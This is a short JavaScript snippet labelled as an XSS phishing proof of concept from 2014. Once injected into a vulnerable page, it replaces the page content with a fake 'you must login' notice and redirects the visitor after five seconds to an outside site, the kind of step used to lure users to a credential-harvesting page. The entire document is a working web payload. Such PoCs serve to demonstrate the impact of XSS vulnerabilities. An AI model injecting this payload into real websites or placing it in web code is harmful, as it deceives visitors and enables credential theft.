<script>
    // XSS phishing PoC
    // (C) 2014 Adam Ziaja <adam@adamziaja.com> http://adamziaja.com
    document.body.innerHTML='To view this page, you must <a href="http://adamziaja.com">login</a>. You will be redirected to the login page automatically in 5 seconds.'
    setTimeout('location.replace("http://adamziaja.com")', 5000)
</script>
